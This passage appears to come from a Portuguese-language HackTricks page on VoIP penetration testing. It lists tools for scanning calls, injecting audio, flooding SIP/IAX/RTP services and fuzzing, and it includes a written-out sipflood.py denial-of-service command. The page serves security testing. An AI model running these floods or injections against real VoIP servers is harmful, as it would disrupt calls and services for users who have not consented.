Ou voc√™ pode usar os scripts de [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) para **escanear conversas** (**`rtpscan.pl`**), enviar um arquivo `.wav` para uma conversa (**`rtpsend.pl`**) e **inserir ru√≠do** em uma conversa (**`rtpflood.pl`**).

### DoS

Existem v√°rias maneiras de tentar realizar um ataque de nega√ß√£o de servi√ßo (DoS) em servidores VoIP.

* **`sipflood.py`** do [**sippts**](https://github.com/Pepelux/sippts)**: **_**SipFlood**_ envia mensagens ilimitadas para o alvo.
* `python3 sipflood.py -i 10.10.0.10 -r 5080 -m invite -v`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): DoS no protocolo IAX usado pelo Asterisk.
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): Uma ferramenta para realizar ataques de inunda√ß√£o de mensagens SIP/SDP INVITE por UDP/IP.
* [**rtpflood**](https://www.kali.org/tools/rtpflood/): Envia v√°rios pacotes RTP bem formados. √â necess√°rio saber as portas RTP que est√£o sendo usadas (fareje primeiro).
* [**SIPp**](https://github.com/SIPp/sipp): Permite analisar e gerar tr√°fego SIP, portanto, tamb√©m pode ser usado para DoS.
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): Canivete su√≠√ßo SIP. Tamb√©m pode ser usado para realizar ataques SIP.
* Fuzzers: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).
* **`sipsend.py`** do [**sippts**](https://github.com/Pepelux/sippts)**:** SIPSend nos permite enviar uma mensagem SIP personalizada e analisar a resposta.
* **`wssend.py`** do [**sippts**](https://github.com/Pepelux/sippts)**:** WsSend nos permite enviar uma mensagem SIP personalizada por meio do WebSocket e analisar a resposta.

### Vulnerabilidades do sistema operacional

A maneira mais f√°cil de instalar um software como o Asterisk √© baixar uma **distribui√ß√£o do sistema operacional** que j√° o tenha instalado, como: **FreePBX, Elastix, Trixbox**... O problema √© que, uma vez em funcionamento, os administradores de sistema podem **n√£o atualiz√°-los novamente** e vulnerabilidades ser√£o descobertas com o tempo.

## Refer√™ncias

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Gostaria de ver sua **empresa anunciada no HackTricks**? Ou gostaria de ter acesso √† **vers√£o mais recente do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me no** **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
